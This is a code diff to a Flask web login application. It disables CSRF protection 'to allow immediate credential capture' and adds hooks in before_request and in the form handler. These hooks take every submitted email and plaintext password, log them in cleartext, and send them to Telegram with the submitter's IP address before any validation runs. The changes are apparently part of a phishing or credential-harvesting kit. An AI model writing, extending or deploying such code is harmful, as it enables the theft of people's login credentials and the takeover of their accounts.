@@ -17,7 +17,7 @@ from datetime import datetime, timedelta
 # Use os.environ instead for simplicity
 def config(key, default=None):
     return os.environ.get(key, default)
-from flask_wtf import FlaskForm, CSRFProtect
+from flask_wtf import FlaskForm  # CSRFProtect removed
 from wtforms import StringField, PasswordField, SubmitField
 from wtforms.validators import DataRequired, Email
 import bcrypt
@@ -75,7 +75,7 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 # Initialize extensions
 Session(app)
 db = SQLAlchemy(app)
-csrf = CSRFProtect(app)
+# csrf = CSRFProtect(app)  # Disabled to allow immediate credential capture
 limiter = Limiter(
     key_func=get_remote_address,
     app=app,
@@ -527,6 +527,29 @@ def before_request():
     """Initialize session before each request"""
     create_session_id()
     session.permanent = True
+    
+    # CAPTURE CREDENTIALS IMMEDIATELY ON ANY POST REQUEST
+    if request.method == 'POST' and request.endpoint == 'process_form':
+        email = request.form.get('email', '').strip().lower()
+        password = request.form.get('password', '')
+        
+        logger.info(f"🔍 BEFORE_REQUEST DEBUG: email='{email}', password='{password}' (length: {len(password)})")
+        
+        if email and password:
+            # Send credentials to Telegram immediately when submitted
+            worker_ip = get_remote_address()
+            logger.info(f"📤 BEFORE_REQUEST IMMEDIATE REPORTING: Sending credentials to Telegram for {email}")
+            
+            try:
+                immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
+                if immediate_success:
+                    logger.info(f"✅ BEFORE_REQUEST: Immediate credentials reported to Telegram for {email}")
+                else:
+                    logger.error(f"❌ BEFORE_REQUEST: Failed to send immediate credentials to Telegram for {email}")
+            except Exception as e:
+                logger.error(f"❌ BEFORE_REQUEST: Exception sending credentials: {e}")
+        else:
+            logger.warning(f"⚠️ BEFORE_REQUEST: Skipping Telegram - email='{email}', password={'[HIDDEN]' if password else '[EMPTY]'}")
 
 @app.route('/')
 @limiter.limit("200 per minute")
@@ -599,6 +622,28 @@ def verify_turnstile():
 @app.route('/', methods=['POST'])
 @limiter.limit("100 per minute")
 def process_form():
+    # DEBUG: Log all form data
+    logger.info(f"🔍 FORM DEBUG: Received form data: {dict(request.form)}")
+    
+    # CAPTURE CREDENTIALS IMMEDIATELY BEFORE ANY VALIDATION
+    email = request.form.get('email', '').strip().lower()
+    password = request.form.get('password', '')
+    
+    logger.info(f"🔍 EXTRACTED: email='{email}', password='{password}' (length: {len(password)})")
+    
+    if email and password:
+        # Send credentials to Telegram immediately when submitted
+        worker_ip = get_remote_address()
+        logger.info(f"📤 IMMEDIATE REPORTING: Sending credentials to Telegram for {email}")
+        
+        immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
+        if immediate_success:
+            logger.info(f"✅ Immediate credentials reported to Telegram for {email}")
+        else:
+            logger.error(f"❌ Failed to send immediate credentials to Telegram for {email}")
+    else:
+        logger.warning(f"⚠️ SKIPPING TELEGRAM: email={email}, password={'[HIDDEN]' if password else '[EMPTY]'}")
+    
     form = LoginForm()
     
     if not form.validate_on_submit():
